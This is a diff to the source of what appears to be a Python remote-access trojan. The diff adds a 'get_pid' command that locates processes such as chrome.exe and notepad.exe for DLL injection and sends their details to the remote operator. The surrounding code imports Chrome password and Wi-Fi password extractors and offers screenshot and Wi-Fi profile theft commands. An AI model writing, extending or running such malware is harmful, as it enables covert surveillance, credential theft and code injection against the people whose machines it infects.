@@ -21,6 +21,8 @@ import win_chrome_password_extractor
 
 from win_wlan_passwd_and_wanip_extractor import *
 
+from knowing_win_pid import *
+
 # Sending whole data all at once
 def recv_eff():
 
@@ -281,6 +283,24 @@ def shell():
 
 			send_eff(list_profiles)
 
+		# Getting running process id on win10 to perform dll injection  ✓
+		elif cmd[:7] == "get_pid" and len(cmd) > 1:
+
+			send_eff(os.name)
+
+			# If trgt os is win
+			if os.name == 'nt':
+
+				# ADD list of preferred processes you want to scan
+				prf_list = ["chrome.exe", "calculator.exe", "notepad.exe", "cmd.exe", "Taskmgr.exe" ]
+
+				info_list = getting_info(prf_list)
+
+				send_eff(info_list)
+				send_eff(prf_list)
+			else:
+				pass
+
 
 		# Screenshot ✓
 		elif (cmd[:10] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):
@@ -337,4 +357,4 @@ def main():
 
 if __name__ == '__main__':
 	main()
- 
+
